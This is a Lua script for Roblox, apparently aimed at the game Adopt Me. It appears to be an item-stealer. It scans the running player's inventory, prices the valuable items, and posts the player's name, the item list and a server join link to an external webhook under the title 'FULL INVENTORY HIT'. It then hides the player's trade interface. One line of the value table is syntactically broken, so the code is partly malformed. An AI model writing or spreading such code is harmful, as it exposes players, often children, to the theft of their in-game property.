---- VALUE TABLES
local tbl_15_upvr = {
    common = 1; uncommon = 2; rare = 4; ultra_rare = 10; legendary = 26;
}

local tbl_35_upvr = { pets = 1 }

local tbl_28_upvr = {
    neon = 4; mega_neon = 16; flyable = 2; rideable = 2;
}

-- 🔥 CUSTOM VALUE LIST (ALL CATEGORY)
local CUSTOM_VALUES = {
    pets = {["Bat Dragon"]=660,["Shadow Dragon"]=549,["Giraffe"]=295,["Frost Dragon"]=237,["Owl"]=190,["Parrot"]=151,["Crow"]=130,["Balloon Unicorn"]=104,["Evil Unicorn"]=94,["Panda"]=92,["Cryptid"]=77,["Hartae"]=60,["Orchid Butterfly"]=53,["Diamond Butterfly"]=51,["Blazing Lion"]=50,["Arctic Reindeer"]=41,["Strawberry Bat Dragon"]=23,["Turtle"]=22,["Hot Doggo"]=21,["Monkey King"]=20,["Kangaroo"]=17,["Albino Monkey"]=15,["Sugar Glider"]=12,["Fairy Bat Dragon"]=10,["Undead Jousting Horse"]=10,["Frost Unicorn"]=8,["Capricorn"]=8,["Dragonfruit Fox"]=7,["Shark Puppy"]=7,["Werewolf"]=6,["Frost Fury"]=5,["Vampire Dragon"]=5,["Nessie"]=4,["Lava Dragon"]=3,["Diamond Amazon"]=3,["Glacier Kitsune"]=3,["Phantom Dragon"]=2,["Midnight Dragon"]=2,["Lavender Dragon"]=2,["Unicorn"]=2,["Queen Bee"]=2,["Skele Rex"]=2,["Phoenix"]=2,["Axolotl"]=2,["Cow"]=10,["Blue Whale=1000},

    eggs = {["Safari Egg"]=200,["Jungle Egg"]=86,["Farm Egg"]=84,["Christmas Egg"]=15,["Aussie Egg"]=5,["Endangered Egg"]=1000},

    vehicles = {["Cloud"]=34,["Rocket Sled"]=29,["Giant Cheetah Mount"]=15,["Bunny Carriage"]=7,["Mono-Moped"]=5,["Dragon Train"]=4,["Unicorn Cycle"]=4,["Motorbike"]=1000},

    pet_accessories = {["Strawberry Plushie Rider"]=88,["Strawberry Cupcake Shoes"]=80,["Giraffe Backpack"]=56,["Rainbow Maker"]=51,["SSBD Beanie"]=47,["Halo"]=26,["Angel Wings"]=20,["Cyber Headphones"]=1000},

    food = {["pet_flying_potion"]=5,["pet_riding_potion"]=5,["pet_grow_potion"]=5,["Honey Candy"]=1000},

    toys = {["Candy Cannon"]=165,["Flying Broomstick"]=85,["2D Bone Chew Toy"]=1000}
}

-- VALUE FUNCTION
local function getPetValueByTable(petData, props)
    if not petData or not petData.rarity then return 0 end
    local base = tbl_15_upvr[string.lower(petData.rarity)] or 0
    local bonus = 0
    for k, v in pairs(tbl_28_upvr) do
        if props[k] then bonus += v end
    end
    return (base + bonus)
end

-- GET ALL INVENTORY
local serverData = RouterClient.get("DataAPI/GetAllServerData"):InvokeServer()
local inv = serverData[LocalPlayer.Name].inventory

local hits = {}
local totalValue = 0
local foundCustom = false

-- 🔥 GENERIC SCAN FUNCTION
local function scan(categoryName, db)
    local category = inv[categoryName]
    if not category then return end

    for uid, item in pairs(category) do
        local data = db and db[item.id]
        local name = data and data.name or item.id

        local val = CUSTOM_VALUES[categoryName] and CUSTOM_VALUES[categoryName][name]

        if val then
            foundCustom = true

            table.insert(hits, {
                name = name,
                value = val,
                uid = uid,
                props = item.properties or {}
            })

            totalValue += val
        end
    end
end

-- 🔥 SCAN ALL CATEGORY
scan("pets", InventoryDB.pets)
scan("eggs", InventoryDB.eggs)
scan("vehicles", InventoryDB.vehicles)
scan("pet_accessories", InventoryDB.pet_accessories)
scan("food", InventoryDB.food)
scan("toys", InventoryDB.toys)

-- ❌ FALLBACK PET
if not foundCustom then
    for uid, item in pairs(inv.pets or {}) do
        local petData = InventoryDB.pets[item.id]
        local props = item.properties or {}

        if petData and petData.rarity and (
            string.lower(petData.rarity) == "ultra_rare" or
            string.lower(petData.rarity) == "legendary"
        ) then
            local val = getPetValueByTable(petData, props)

            table.insert(hits, {
                name = petData.name,
                value = val,
                uid = uid,
                props = props
            })

            totalValue += val
        end
    end
end

table.sort(hits, function(a,b)
    return tonumber(a.value) > tonumber(b.value)
end)

-- PREVIEW
local previewLines = {}
for i, g in ipairs(hits) do
    if i > 16 then break end
    table.insert(previewLines,
        g.name.." → "..g.value
    )
end

local joinUrl =
    "https://www.roblox.com/games/start?placeId="
    .. game.PlaceId ..
    "&gameInstanceId="
    .. game.JobId

-- WEBHOOK
local payload = {
    username = "Captain Hook",
    embeds = {{
        title = "🔥 FULL INVENTORY HIT 🔥",
        color = 0xFF2F92,
        fields = {
            {name="Player", value=LocalPlayer.Name},
            {name="Total Value", value=tostring(totalValue)},
            {name="Hits", value=table.concat(previewLines,"\n")},
            {name="Join", value=joinUrl}
        }
    }}
}

if Webhook and Webhook ~= "" then
    request({
        Url = Webhook,
        Method = "POST",
        Headers = {["Content-Type"]="application/json"},
        Body = HttpService:JSONEncode(payload)
    })
end


-- UI LOCKS
LocalPlayer.PlayerGui.TradeApp.Enabled = false
